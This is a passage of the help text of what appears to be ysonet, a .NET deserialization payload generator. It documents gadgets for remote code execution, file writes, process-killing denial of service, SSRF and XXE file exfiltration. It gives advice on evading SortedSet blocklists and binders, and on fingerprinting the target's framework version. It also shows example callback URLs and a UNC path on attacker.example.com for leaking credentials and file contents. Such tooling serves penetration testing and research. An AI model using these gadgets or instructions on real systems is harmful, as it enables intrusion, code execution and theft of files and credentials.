			                               h;localContentFile"), 2 -> copy a file, 3 ->
			                               move a file, 4 -> move a directory (2-4 take -c
			                               "sourcePath;destinationPath"), 5 -> create or
			                               truncate an empty file (-c "targetPath"). Every
			                               path except the local content file is a path on
			                               the TARGET and is never touched here. Only the
			                               first ';' splits the value, so the second field
			                               may contain more of them. The two strings only
			                               have to DIFFER, in either order; an equal pair
			                               is refused because the sorted container would
			                               collapse it to one element and the payload would
			                               do nothing. Preconditions on the target: write
			                               and empty create or overwrite the file but do
			                               not create its parent directory; copy and both
			                               moves do not overwrite an existing destination;
			                               dirmove needs an existing source, a free
			                               destination and the same volume; all of them
			                               need the target process to have the file-system
			                               rights. --minify with NetDataContractSerializer
			                               or SoapFormatter is refused when it would
			                               rewrite either string (the XML minifier trims
			                               trailing whitespace, drops a carriage return,
			                               and collapses "; "); SOAP is also refused
			                               without --minify if its XML writer loses a valu-
			                               e. BinaryFormatter and LosFormatter minify the
			                               same input safely. Minification may therefore be
			                               refused when content has characters that must
			                               survive exactly.
			                               Default value: "1".
			                               Suggested values: 1, 2, 3, 4, 5.
			      --rootcontainer=VALUE  Serialized root container, independent of the
			                               five file-operation variants: 1 -> SortedSet
			                               [default], 2 -> SortedDictionary, 3 -> TreeSet.
			                               BinaryFormatter, NetDataContractSerializer and
			                               LosFormatter support all three roots.
			                               SoapFormatter supports all five file operations
			                               with roots 1 and 3, but not root 2. The (5)
			                               formatter annotation counts file-operation
			                               variants, not root choices. Roots 2 and 3 evade
			                               a binder or blocklist that rejects the exact
			                               SortedSet wire type name. Changing this option
			                               does not change the selected file operation.
			                               Default value: "1".
			                               Suggested values: 1, 2, 3.

			Categories [variant 1]:
			  Kind: File system
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Local file, Target path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 2]:
			  Kind: File system
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Target path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 3]:
			  Kind: File system
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Target path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 4]:
			  Kind: File system
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Target path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 5]:
			  Kind: File system
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Target path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) TypeConfuseDelegateMono [Tweaked TypeConfuseDelegate gadget to work with Mono; --legacyfx is not supported because that option targets .NET Framework CLR2.]
		Formatters: BinaryFormatter, LosFormatter, NetDataContractSerializer
			Labels: An independent gadget
			Categories:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: Mono
	(*) TypeConfuseDelegateNetFx35 [CLR2-only: supports .NET Framework 3.5 and does not support CLR4 or later. Runs Process.Start(string, string) by rebuilding CLR 2's Array.FunctorComparer<string> through Workflow ObjectSerializedRef and triggering it from TreeSet<string>. The SOAP form is a direct List<object>/TreeSet<string> document: only the internal comparer reconstruction uses ObjectSerializedRef, with no outer surrogate carrier or nested BinaryFormatter stream. The payload names CLR-v2 framework identities automatically; an explicit --legacyfx is redundant. The target needs System.Core 3.5 and System.Workflow.ComponentModel. NetDataContractSerializer is not supported: its CLR-2 reader rejects the graph because ObjectSerializedRef's required memberDatas member is missing. On .NET Framework 4.8.1 the Workflow object reference rejects this CLR-2 reconstruction with ArgumentException before the sink. A local --test is therefore routed automatically to the separately shipped .NET Framework 3.5 / CLR2 process; --testclr2 selects it explicitly.]
		Formatters: BinaryFormatter, LosFormatter, SoapFormatter
			Labels: An independent gadget
			Categories:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 3.5
	(*) TypeConfuseDelegateNetFx40 [.NET Framework 4.0-only: reconstructs that runtime's non-serializable Array.FunctorComparer<string> through Workflow ObjectSerializedRef, preloads it before a SortedSet<string> in List<object>, and lets the set call the confused String.Compare/Process.Start delegate while rebuilding. The target needs System.Workflow.ComponentModel. BinaryFormatter, SoapFormatter and LosFormatter are supported; the SOAP form is a direct List<object>/SortedSet<string> document with no outer carrier or nested BinaryFormatter stream. NetDataContractSerializer cannot reproduce the required memberDatas contract. Later CLR 4 builds use an incompatible private comparer shape, so local -t is refused; --legacyfx is also invalid because this graph requires CLR4 identities. When to use it: only when the target's INSTALLED framework is genuinely 4.0 (4.5+ never installed). .NET 4.5+ replaces 4.0 in place, so on any 4.5 to 4.8 target use TypeConfuseDelegate instead. That includes a 'v4.0' IIS app pool, which selects CLR 4, not .NET 4.0, and a web.config targetFramework of 4.0, which only sets compatibility quirks. Decide by the installed framework, not the app pool label: if HKLM ...NDP\v4\Full has a 'Release' value it is 4.5+, and absent means genuine 4.0. How to test it: run ysonet.Net40TestHost.exe --probe on the target (shape=netfx40 confirms genuine 4.0), then its --deserialize fires the payload; a Windows image with 4.0 and no 4.5+ update, or an isolated 4.0 VM, is a suitable victim.]
		Formatters: BinaryFormatter, LosFormatter, SoapFormatter
			Labels: An independent gadget
			Categories:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0
	(*) TypeConfuseDelegatePowerShell [Requires Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0 on the target and the application setting microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck=true. That setting is mandatory on current serviced .NET Framework and cannot be armed by another object in the same graph before Workflow resolves the comparer. The measured target is .NET Framework 4.8.1; older Framework versions are not claimed. The graph needs two distinct command fields, so a one-part --rawcmd value is refused. Local --test runs only when Workflow's effective setting is already true in this process.]
		Formatters: BinaryFormatter, LosFormatter
			Labels: An independent gadget
			Categories:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly
			  Runtime versions: .NET Framework 4.8.1
	(*) WbemClassObjectUnmarshal [Feeds a serialized byte[] to native CoUnmarshalInterface. Variant 1 calls out to your host on RPC 135; variant 2 ships a blob you built.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), DataContractSerializer (2), FsPickler (2), Json.NET (2), LosFormatter (2), NetDataContractSerializer (2), SoapFormatter (2)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Which blob to put in the payload. BOTH variants
			                               do the same thing to the target - hand a byte[]
			                               to native CoUnmarshalInterface - and differ only
			                               in WHO writes those bytes: variant 1 writes them
			                               for you from a host name, variant 2 ships a file
			                               you wrote yourself. Neither one is a code-
			                               execution variant. Choices:
			                               1 (default) - build an OBJREF_STANDARD here from
			                               -c "<host>". The target resolves that host and
			                               connects to it to resolve the OXID, which is the
			                               callback. Give a BARE host name or IP: the RPC
			                               endpoint inside a string binding is ignored and
			                               resolution always goes to port 135, so
			                               "host[1234]" or "host:1234" is refused rather
			                               than shipped as a payload that cannot fire. The
			                               call is not authenticated, so this proves a
			                               connection, not NTLM coercion. It always ends in
			                               a COM error on the target (OR_INVALID_OXID when
			                               the host answers, RPC_S_SERVER_UNAVAILABLE when
			                               it does not) - the callback has already happened
			                               by then. -t is accepted here and behaves as it
			                               does on the other network gadgets: it
			                               deserializes the payload on THIS machine, so
			                               YOUR machine makes the callback. Use it to check
			                               the payload and your listener, and add --
			                               debugmode to see the COM error it ends with.
			                               2 (research) - read a prepared OBJREF from the
			                               local file named by -c and ship it as is. The
			                               file must be readable, non-empty and at most
			                               1048576 bytes. This is an escape hatch, not a
			                               stronger version of variant 1: ysonet does not
			                               parse, validate or understand your bytes, so the
			                               effect is entirely whatever they mean to
			                               CoUnmarshalInterface on the target - which may
			                               be nothing, a callout of your own design, or a
			                               crash. It does NOT by itself give code executio-
			                               n; it only gives you the delivery channel. Use
			                               it when you have built a blob variant 1 cannot
			                               express, such as an OBJREF_CUSTOM. -t is REFUSED
			                               for this variant, because self-testing would
			                               feed your unparsed bytes to native COM on this
			                               machine.
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --rootcarrier=VALUE    Which type sits at the SERIALIZED ROOT.
			                               Orthogonal to variant: it changes the type name
			                               on the wire and nothing else. Both carriers hand
			                               the same byte[] to the same native
			                               CoUnmarshalInterface call, so the effect, the
			                               input and the blob are identical. This is NOT a
			                               SerializationBinder bypass - a binder is
			                               consulted for every type in the stream, nested
			                               ones included, so a binder that blocks the inner
			                               type still blocks carrier 2. Choices:
			                               1 (default) - the bare System.Management.
			                               IWbemClassObjectFreeThreaded, which is internal
			                               to System.Management.
			                               2 - wrap it in the PUBLIC System.Managemen-
			                               t.ManagementBaseObject, which holds it in its
			                               "wbemObject" member and passes it to the same
			                               constructor. Use it when the target names its
			                               own root type (a plain DataContractSerializer
			                               consumer can only ever name a public one), or
			                               when a rule keys on the internal name. Not
			                               available with DataContractSerializer or
			                               FsPickler; those two keep working on carrier 1.
			                               The (2) formatter annotation counts blob
			                               variants, not root-carrier choices.
			                               Default value: "1".
			                               Suggested values: 1, 2.

			Categories [variant 1]:
			  Kind: Network
			  Formatter: BinaryFormatter, DataContractSerializer, FsPickler, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Host name or IP
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Other
			  Formatter: BinaryFormatter, DataContractSerializer, FsPickler, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Local file
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) WindowsClaimsIdentity [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (4), DataContractSerializer (3), Json.NET (3), LosFormatter (4), NetDataContractSerializer (4), SoapFormatter (3)
			Labels: A bridged gadget, Not in GAC
			Supported formatter for the bridge: BinaryFormatter
			Extra options:
			      --var, --variant=VALUE Which member carries the inner BinaryFormatter
			                               payload. 1, 2 and 3 are the ClaimsIdentity keys,
			                               named the same way and numbered the same way as
			                               on the WindowsIdentity gadget: they all start
			                               with 'System.Security.ClaimsIdentity.' and end
			                               with 1 = actor (default), 2 = bootstrapContext,
			                               3 = claims. 4 is different: it is the WIF type's
			                               OWN _actor member, a separate sink inside the
			                               WIF assembly rather than in mscorlib, and it
			                               exists only on BinaryFormatter, LosFormatter and
			                               NDCS. NOTE: what 1-3 build CHANGED when the
			                               numbering was unified - it used to depend on the
			                               formatter. An unknown number falls back to 1.
			                               Default value: "1".
			                               Suggested values: 1, 2, 3, 4.

			Categories [variant 1]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 2]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 3]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 4]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) WindowsIdentity [The variant picks which ClaimsIdentity key carries the inner BinaryFormatter payload.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (3), DataContractSerializer (3), Json.NET (3), LosFormatter (3), NetDataContractSerializer (3), SoapFormatter (3)
			Labels: A bridged gadget
			Supported formatter for the bridge: BinaryFormatter
			Extra options:
			      --var, --variant=VALUE Which SerializationInfo key carries the inner
			                               BinaryFormatter payload. All three names start
			                               with 'System.Security.ClaimsIdentity.' and end
			                               with: 1 = actor (default, the shortest), 2 =
			                               bootstrapContext, 3 = claims. All three reach
			                               the same unbindered BinaryFormatter in
			                               ClaimsIdentity.Deserialize and have the same
			                               effect; they differ only in the member NAME on
			                               the wire. An unknown number falls back to 1.
			                               Default value: "1".
			                               Suggested values: 1, 2, 3.

			Categories [variant 1]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 2]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 3]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) WindowsPrincipal
		Formatters: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: A bridged gadget
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) WorkflowDesigner [PropertyInspectorFontAndColorData is a write-only string whose setter runs XamlReader.Load on it (XmlResolver is null, so no XXE). The target needs System.Activities.Presentation and an STA thread.]
		Formatters: FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml
			Labels: A bridged gadget
			Supported formatter for the bridge: Xaml
			Categories:
			  Kind: Code execution, Nested deserialization
			  Formatter: FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml
			  Accepted input: Command
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) WSManPluginInstance [Builds a Windows PowerShell type whose finalizer terminates the target process. The effect is asynchronous and needs System.Management.Automation.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, FastJson, JavaScriptSerializer, Json.NET, LosFormatter, MessagePackTypeless, MessagePackTypelessLz4, NetDataContractSerializer, SharpSerializerBinary, SharpSerializerXml, SoapFormatter, Xaml, XmlSerializer, YamlDotNet < 5.0.0
			Labels: An independent gadget
			Extra options:
			      --assembly=VALUE       The assembly display name written into the
			                               payload.
			                               Default: "System.Management.Automation,
			                               Version=3.0.0.0, Culture=neutral,
			                               PublicKeyToken=31bf3856ad364e35"
			                               which is Windows PowerShell's GAC identity. The
			                               3.0.0.0 assembly version has been Windows
			                               PowerShell's since PowerShell 3.0 and is still
			                               what Windows PowerShell 5.1 ships (verified
			                               there), so the default is what you want against
			                               a normal Windows target.

			                               The value is written EXACTLY as typed and only
			                               an empty one is refused. Whether a name binds is
			                               the target's decision, not this tool's, so a
			                               repackaged, renamed, side-by-side or differently
			                               versioned copy is yours to point at. The TYPE
			                               name never changes: System.Management.Automatio-
			                               n.Remoting.
			                               WSManPluginManagedEntryInstanceWrapper.

			                               PowerShell 7 ships System.Management.Automation
			                               under a different identity on a different
			                               runtime. Nothing here has been reproduced
			                               against it, so there is no preset for it and no
			                               claim about it.

			                               WHAT THE PAYLOAD DOES. The target builds the
			                               type; its finalizer frees a GCHandle that was
			                               never allocated, which throws on the finalizer
			                               thread, and an exception there terminates the
			                               process. The effect is ASYNCHRONOUS - it waits
			                               for a collection - so do not expect it at the
			                               moment of deserialization.
			                               Default value: "System.Management.Automation,
			                               Version=3.0.0.0, Culture=neutral,
			                               PublicKeyToken=31bf3856ad364e35".

			Categories:
			  Kind: Denial of service
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, FastJson, JavaScriptSerializer, Json.NET, LosFormatter, MessagePackTypeless, MessagePackTypelessLz4, NetDataContractSerializer, SharpSerializerBinary, SharpSerializerXml, SoapFormatter, Xaml, XmlSerializer, YamlDotNet
			  Accepted input: None
			  Requirements: .NET Framework, Extra assembly
			  Runtime versions: Unspecified
	(*) XamlAssemblyLoadFromFile [Loads assembly using XAML. This gadget interprets the command parameter as the path to the .cs file that should be compiled as an exploit class. Use a semicolon to separate the file from any additional required assemblies, e.g., '-c ExploitClass.cs;System.dll'. Variant 1 also takes rootcontainer (1 SortedSet, 2 SortedDictionary, 3 TreeSet) to dodge a SortedSet wire-name blocklist; SoapFormatter supports roots 1 and 3. It self-tests in a child process.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), LosFormatter (2), NetDataContractSerializer (2), SoapFormatter (2)
			Labels: A payload with no new sink, carried by another gadget
			Extra options:
			      --var, --variant=VALUE Choices: 1 -> use TypeConfuseDelegateGenerator
			                               [default], 2 -> use
			                               TextFormattingRunPropertiesMarshal
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --rootcontainer=VALUE  Serialized root container of the
			                               TypeConfuseDelegate wrapper: 1 -> SortedSet
			                               [default], 2 -> SortedDictionary, 3 -> TreeSet.
			                               2 and 3 evade a binder or blocklist that rejects
			                               the exact SortedSet wire type name.
			                               SoapFormatter supports 1 and 3, not 2. Not used
			                               by the TextFormattingRunProperties wrapper
			                               (variant 2), which has no container. The (2)
			                               formatter annotation counts wrapper variants,
			                               not root-container choices.
			                               Default value: "1".
			                               Suggested values: 1, 2, 3.

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Source code file
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Source code file
			  Requirements: .NET Framework, Extra assembly, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) XamlImageInfo [Gadget leads to XAML deserialization. Variant 1 (GAC) reads XAML from file (local path or UNC path can be given). Variant 2 (non-GAC) delivers XAML directly, but requires Microsoft.Web.Deployment.dll] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: Json.NET (2)
			Labels: Variant 1 in GAC, Variant 2 not in GAC
			Extra options:
			      --var, --variant=VALUE Variant number. Variant defines a different
			                               Stream delivery class. Choices:
			                               1 (default and GAC) - LazyFileStream for Stream
			                               delivery, file path has to be provided for -c
			                               argument (UNC or local)
			                               2 (non-GAC, requires Microsoft.Web.Deploymen-
			                               t.dll) - ReadOnlyStreamFromStrings for Stream
			                               delivery, command to execute can be provided for
			                               -c argument
			                               Default value: "1".
			                               Suggested values: 1, 2.

			Categories [variant 1]:
			  Kind: Nested deserialization
			  Formatter: Json.NET
			  Accepted input: Local file, UNC path
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: Unspecified
			Categories [variant 2]:
			  Kind: Code execution, Nested deserialization
			  Formatter: Json.NET
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly, WPF
			  Runtime versions: Unspecified
	(*) XamlTypeConverterFetch [One ordinary XAML attribute makes the target fetch -c through a [TypeConverter]. No ObjectDataProvider and no constructor. Remote image loading is documented WPF behaviour, so this is a shape, not a new bug.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: JavaScriptSerializer (2), Json.NET (2), Xaml (2), YamlDotNet < 5.0.0 (2)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Which type converter the attribute selects.
			                               Choices: 1, 2. Default: "1".

			                               1 (default) - ImageSourceConverter, through
			                               <ImageDrawing ImageSource="..."/>. Any non-empty
			                               value is fetched: no suffix rule and no scheme
			                               rule. Every ImageSource-typed member reaches the
			                               same converter, so the carrier can be swapped
			                               for whatever your target already accepts (Image
			                               Source, ImageBrush ImageSource, Window Icon, and
			                               so on). ImageDrawing is used because it is a
			                               Freezable with no type converter of its own, so
			                               it works whatever thread the target deserializes
			                               on.
			                               2 - CursorConverter, through <Label Cursor=".-
			                               .."/>. Cursor is declared on FrameworkElement,
			                               so every element carries it - but the value MUST
			                               end in .cur or .ani, or the converter takes its
			                               named-cursor branch and the payload does nothin-
			                               g. It also has a second leg the other variant
			                               does not: a value that resolves to a file URI is
			                               opened as a FILE rather than fetched, so a UNC
			                               path is an SMB session.

			                               VARIANT 2 NEEDS A UI THREAD on every format
			                               except Xaml. Its carrier is a FrameworkElement,
			                               and building one on a thread that is not STA
			                               throws "The calling thread must be STA" before
			                               the converter runs - so a service that
			                               deserializes JSON on a thread-pool thread does
			                               not fire it, while a WPF application
			                               deserializing on its own UI thread does. Variant
			                               1 has no such condition.
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --rawinput             Put -c into the payload template exactly as
			                               typed, instead of escaping it for XML. Use this
			                               only when you have already escaped the value
			                               yourself. It also turns off the check that the
			                               finished payload still carries your URI
			                               unchanged, because there is then no text of
			                               yours left to compare against.

			                               WHAT TO PUT IN -c. An absolute URI the target's
			                               WebRequest stack accepts:
			                                 http://attacker.example.com/beacon
			                                 http://attacker.example.com/beacon.cur
			                               (variant 2)
			                                 \\attacker.example.com\share\x.cur
			                               (variant 2, a file open)
			                               Nothing has to exist on the far end and nothing
			                               has to be a real image or cursor: the target
			                               pays for the connect before anything is decoded.
			                               A RELATIVE value is resolved against the
			                               parser's own base URI, which you cannot see, so
			                               always use an absolute one.

			                               WHAT THE TARGET DOES WITH IT. For http or https
			                               WPF sets UseDefaultCredentials on the request,
			                               so the target process offers its ambient
			                               credentials if the server asks and the
			                               platform's credential policy allows it. The
			                               bytes go to the image decoders or the cursor
			                               parser; they are never sent anywhere and you
			                               never see them.

			                               -t IS ACCEPTED and it parses the payload HERE,
			                               so THIS machine makes the request you asked for.
			                               Against a UNC path Windows sends authentication
			                               material when it opens the SMB session, so only
			                               point it at an endpoint you own.

			                               WHAT A CALLBACK PROVES. That the target resolved
			                               your host and opened the request. It is not
			                               proof of a completed SMB session, of NTLM
			                               authentication, of captured credentials, or of a
			                               relay: those depend on the target, the network
			                               and your endpoint.
			                               Default value: "false".

			Categories [variant 1]:
			  Kind: Network
			  Formatter: JavaScriptSerializer, Json.NET, Xaml, YamlDotNet
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in, Modern .NET, WPF
			  Runtime versions: .NET Framework 4.8.1, .NET 10.0
			Categories [variant 2]:
			  Kind: Network
			  Formatter: JavaScriptSerializer, Json.NET, Xaml, YamlDotNet
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in, Modern .NET, WPF
			  Runtime versions: .NET Framework 4.8.1, .NET 10.0
	(*) XmlDocumentSurrogateXxe [A [Serializable] IObjectReference carrier in System.Workflow.ComponentModel whose GetRealObject sets XmlDocument.InnerXml, so the target parses your XML. Variant 1 makes the target fetch your URL; variant 2 reads a target file back to you. No surrogate selector has to be registered. Needs System.Workflow.ComponentModel. Fires when the target app uses pre-4.5.2 XML resolver defaults, when the machine turned the EnableLegacyXmlSettings switch back on, or when the app declares NO target framework moniker at all - an ASP.NET app with no <httpRuntime targetFramework> is legacy even on a fully patched 4.8.1 machine.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), DataContractJsonSerializer (2), DataContractSerializer (2), FsPickler (2), LosFormatter (2), NetDataContractSerializer (2), SoapFormatter (2)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Which XML to put in the carrier's innerXml fiel-
			                               d. Choices:
			                               1 (default) - declare one external parameter
			                               entity pointing at the -c URL and reference it,
			                               so the target FETCHES that URL. The effect is a
			                               single outbound request (SSRF / callback) and
			                               nothing comes back to you. Point it at any http
			                               or https URL you can observe.
			                               2 - read a file on the TARGET and have the
			                               target send its content to you. -c is the BASE
			                               URL of a host you control; ysonet builds two
			                               URLs under it, "xmldocsurrogate-oob.dtd" and
			                               "collect". --file names what to read on the
			                               TARGET, in whatever form that target's parser
			                               resolves. --dtd-out is where ysonet writes the
			                               DTD you must publish at the first URL: without
			                               it hosted, the payload fetches a 404 and nothing
			                               is disclosed. Read the file content out of the
			                               query string of the request that arrives at the
			                               second URL.
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --rawinput             Skip the URL validation and put -c into the DTD
			                               external identifier exactly as typed, with no
			                               trimming. Normal mode accepts an absolute http
			                               or https URL and refuses whitespace, control
			                               characters and the characters " < > \, because
			                               the value goes inside a QUOTED DTD external
			                               identifier and those would corrupt or escape it.
			                               Use this only for research on a resolver that
			                               accepts something else; the network effect this
			                               gadget declares was proven with http(s). It does
			                               NOT turn off the outer formatter's escaping, so
			                               the payload is still a valid document - but
			                               nothing checks that the identifier inside it
			                               still is, and a broken one simply fetches
			                               nothing.
			                               Default value: "false".
			      --file=VALUE           Variant 2 only, and required there. What to read
			                               ON THE TARGET, usually an absolute file: URI,
			                               for example "file:///C:/Windows/system.ini". The
			                               value is NOT validated or rewritten: it goes
			                               into the hosted DTD exactly as typed, so a bare
			                               path, a UNC path, an http URL or any other form
			                               the target's XML parser resolves is accepted,
			                               and finding out what it resolves is the point.
			                               Nothing is opened on this machine. It sits in a
			                               quoted DTD system identifier, where no
			                               references are recognised, so '%' and '&' are
			                               literal and "file:///C:/Program%20Files/x.txt"
			                               is the right way to write a space; only a double
			                               quote ends the identifier and breaks the DTD.
			                               WHAT COMES BACK RELIABLY, measured rather than
			                               assumed: the content travels in a URL query
			                               string, so spaces, line breaks, < > and " all
			                               arrive percent-encoded and can be decoded. Any
			                               of & % ' # in the file BREAKS the chain and you
			                               get no second request at all, because the first
			                               three end a construct inside the DTD and the
			                               last one starts a URI fragment. That is why a
			                               short .ini style file comes back whole and a
			                               file full of entity references or apostrophes
			                               does not.
			      --dtd-out=VALUE        Variant 2 only, and required there. Where to
			                               write the companion DTD you have to publish at <-
			                               c>/xmldocsurrogate-oob.dtd. The path is taken as
			                               given: a file already there is REPLACED and a
			                               missing folder is created, so generating twice
			                               to the same path works and ysonet says on stderr
			                               when it replaced something. The DTD is written
			                               only after the payload is built, so a failed run
			                               leaves what is already at that path alone. UTF-8
			                               with no BOM, because the target reads it as an
			                               external subset with no XML declaration to learn
			                               an encoding from. This is separate from --
			                               outputpath, which still receives the payload
			                               itself.

			Categories [variant 1]:
			  Kind: Network
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, FsPickler, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.5.1
			Categories [variant 2]:
			  Kind: File system, Information disclosure, Network
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, FsPickler, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Remote URL, Target path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.5.1
	(*) XmlDocumentXxe [Sets XmlDocument.InnerXml, so the target parses your XML and fetches an external DTD. Variant 1 needs a target app on pre-4.5.2 XML resolver defaults, a machine with the EnableLegacyXmlSettings switch back on, or an app that declares NO target framework moniker at all - an ASP.NET app with no <httpRuntime targetFramework> is legacy even on a fully patched 4.8.1 machine. Variant 2 also sets XmlDocument.XmlResolver, which removes that gate entirely.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: FastJson, JavaScriptSerializer (2), MessagePackTypeless (2), MessagePackTypelessLz4 (2), SharpSerializerBinary (2), SharpSerializerXml (2), Xaml (2), YamlDotNet < 5.0.0
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Which payload to build. Choices:
			                               1 (default) - set InnerXml only. The target's
			                               own XmlTextReader default decides whether the
			                               DTD is fetched, so this fires against an
			                               application built below .NET Framework 4.5.2, or
			                               on a machine where the EnableLegacyXmlSettings
			                               switch was turned back on. Smallest payload,
			                               widest formatter list.
			                               2 - set XmlResolver to a real System.Xm-
			                               l.XmlUrlResolver BEFORE InnerXml. The document
			                               then uses YOUR resolver instead of the reader's
			                               default, so the 4.5.2 hardening does not apply
			                               and any target version fetches. Costs FastJson
			                               and YamlDotNet, which cannot fill that member.
			                               Both variants make the SAME request; they differ
			                               only in whether the target had to be on the old
			                               defaults.
			                               Variant 2 is the technique Netwrix published for
			                               MessagePack Typeless (see docs/references.md).
			                               One target-side caveat belongs with it:
			                               MessagePack-CSharp before 2.3.75 calls EVERY
